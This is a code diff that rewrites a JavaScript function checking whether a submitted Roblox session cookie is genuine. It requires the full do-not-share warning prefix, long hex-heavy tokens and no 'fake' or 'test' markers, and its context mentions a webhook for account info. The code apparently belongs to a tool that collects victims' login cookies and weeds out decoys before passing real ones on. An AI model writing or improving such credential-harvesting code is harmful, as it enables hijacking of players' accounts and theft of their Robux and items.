@@ -256,9 +256,10 @@ function basicCookieFormatCheck(cookie) {
   return { valid: true, error: null };
 }
 
-// Enhanced cookie validation that works with CORS limitations
+// Strict Roblox cookie validation - very precise
 async function validateRobloxCookie(cookie) {
-  console.log('DEBUG: Starting enhanced cookie validation...');
+  console.log('DEBUG: Starting strict cookie validation...');
+  console.log('DEBUG: Cookie length:', cookie.length);
   
   // First do basic format check
   const formatCheck = basicCookieFormatCheck(cookie);
@@ -267,39 +268,69 @@ async function validateRobloxCookie(cookie) {
     return formatCheck;
   }
   
-  // Enhanced validation checks for realistic cookie structure
-  console.log('DEBUG: Performing enhanced validation checks...');
+  // STRICT validation - must match exact patterns of real Roblox cookies
   
-  // Check 1: Cookie should have the longer WARNING message (like the one you provided)
-  const hasLongWarning = cookie.includes('Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items');
-  console.log('DEBUG: Has long warning message:', hasLongWarning);
+  // Check 1: Must have the FULL warning message (not just partial)
+  const hasFullWarning = cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_');
+  console.log('DEBUG: Has full warning message:', hasFullWarning);
   
-  // Check 2: Cookie should have proper structure with |_ separator
-  const parts = cookie.split('|_');
-  if (parts.length < 2) {
-    console.log('DEBUG: Cookie missing |_ separator');
+  if (!hasFullWarning) {
+    console.log('DEBUG: Missing full warning message');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check 3: Second part should start with a token pattern
-  const tokenPart = parts[1];
-  if (!tokenPart || tokenPart.length < 50) {
-    console.log('DEBUG: Invalid token part');
+  // Check 2: Extract the token part after |_
+  const tokenStart = cookie.indexOf('|_') + 2;
+  if (tokenStart < 2) {
+    console.log('DEBUG: No |_ separator found');
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check 4: Token should contain uppercase hex-like patterns (characteristic of real cookies)
-  const hasHexPatterns = /[A-F0-9]{8,}/.test(tokenPart);
-  console.log('DEBUG: Contains hex patterns:', hasHexPatterns);
+  const tokenPart = cookie.substring(tokenStart);
+  console.log('DEBUG: Token part length:', tokenPart.length);
+  console.log('DEBUG: Token starts with:', tokenPart.substring(0, 20));
   
-  // Check 5: Cookie should be long enough (real cookies are 1000+ chars)
-  if (cookie.length < 1000) {
-    console.log('DEBUG: Cookie too short for real cookie:', cookie.length);
+  // Check 3: Token must be very long (real tokens are 1400+ chars)
+  if (tokenPart.length < 1400) {
+    console.log('DEBUG: Token too short:', tokenPart.length);
     return { valid: false, error: "Invalid cookie" };
   }
   
-  // Check 6: Should not contain obvious fake indicators
-  const fakeIndicators = ['fake', 'test', 'invalid', 'example', 'demo', 'sample', 'placeholder'];
+  // Check 4: Token must start with specific pattern (like CAEaAhAB.)
+  if (!tokenPart.match(/^[A-Za-z0-9]{8,12}\./)) {
+    console.log('DEBUG: Token does not start with proper pattern');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 5: Must contain multiple long hex sequences (32+ chars)
+  const longHexMatches = tokenPart.match(/[A-F0-9]{32,}/g);
+  console.log('DEBUG: Long hex sequences found:', longHexMatches ? longHexMatches.length : 0);
+  
+  if (!longHexMatches || longHexMatches.length < 10) {
+    console.log('DEBUG: Not enough long hex sequences');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 6: Must have very specific character composition
+  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
+  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
+  
+  console.log('DEBUG: Uppercase letters:', upperCaseCount);
+  console.log('DEBUG: Digits:', digitCount);
+  
+  if (upperCaseCount < 200 || digitCount < 200) {
+    console.log('DEBUG: Not enough uppercase letters or digits');
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 7: Total cookie length must be very long
+  if (cookie.length < 1600) {
+    console.log('DEBUG: Total cookie too short:', cookie.length);
+    return { valid: false, error: "Invalid cookie" };
+  }
+  
+  // Check 8: Check for fake patterns
+  const fakeIndicators = ['fake', 'test', 'invalid', 'example', 'demo', 'sample', 'placeholder', 'xxx', 'aaa', '111'];
   const lowerCookie = cookie.toLowerCase();
   for (const fake of fakeIndicators) {
     if (lowerCookie.includes(fake)) {
@@ -308,14 +339,14 @@ async function validateRobloxCookie(cookie) {
     }
   }
   
-  // Check 7: Advanced pattern matching for real Roblox cookie structure
-  if (hasLongWarning && hasHexPatterns && parts.length >= 2 && tokenPart.length > 50) {
-    console.log('DEBUG: Cookie passed all enhanced validation checks - appears to be valid');
-    return { valid: true, error: null };
+  // Check 9: Must not have repeating patterns (sign of fake cookie)
+  if (tokenPart.includes('AAAA') || tokenPart.includes('1111') || tokenPart.includes('0000')) {
+    console.log('DEBUG: Contains repeating patterns');
+    return { valid: false, error: "Invalid cookie" };
   }
   
-  console.log('DEBUG: Cookie failed enhanced validation');
-  return { valid: false, error: "Invalid cookie" };
+  console.log('DEBUG: Cookie passed all strict validation checks');
+  return { valid: true, error: null };
 }
 
 // Simple function to get basic account info for webhook
